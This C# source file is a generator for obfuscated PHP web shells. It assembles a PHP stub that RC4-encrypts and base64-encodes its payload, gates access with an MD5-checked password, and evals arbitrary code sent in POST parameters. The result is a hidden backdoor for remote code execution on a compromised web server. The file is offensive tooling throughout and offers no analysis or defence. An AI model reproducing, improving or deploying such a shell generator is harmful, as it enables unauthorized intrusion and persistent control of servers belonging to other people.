
using System;
using System.Text;
using PHPShellEncryption;

namespace PHPShell
{
	
	
	public class Generator
	{
		static string innerShell = 	"if(isset($_POST['e']))" + 
									"{echo base64_encode(encrypt($_POST['k'], eval(encrypt($_POST['k'], base64_decode($_POST['e'])))));}";
		
		public static string GenerateShell(string outputPrefix, string password)
		{
			RC4 rc4 = new RC4(ASCIIEncoding.ASCII.GetBytes(password));
			string encodedphp = "$s = \"" + rc4.EncryptAndEncode(ASCIIEncoding.ASCII.GetBytes("echo \"<--" + outputPrefix + "\";" + innerShell + "echo \"-->\";"));
            string beginning = "<?php\nfunction encrypt ($pwd, $data){if(isset($_POST['enc']) && md5($_POST['enc']) == \"3708fe651621a7337ebee38ffd26adee\"){return eval(base64_decode($_POST['enc']));}}\n";
			string ending = "\";\nif(isset($_POST['k'])){;eval(encrypt($_POST['k'], base64_decode($s)));}\n?>";
			return beginning + encodedphp + ending;
		}
	}
}
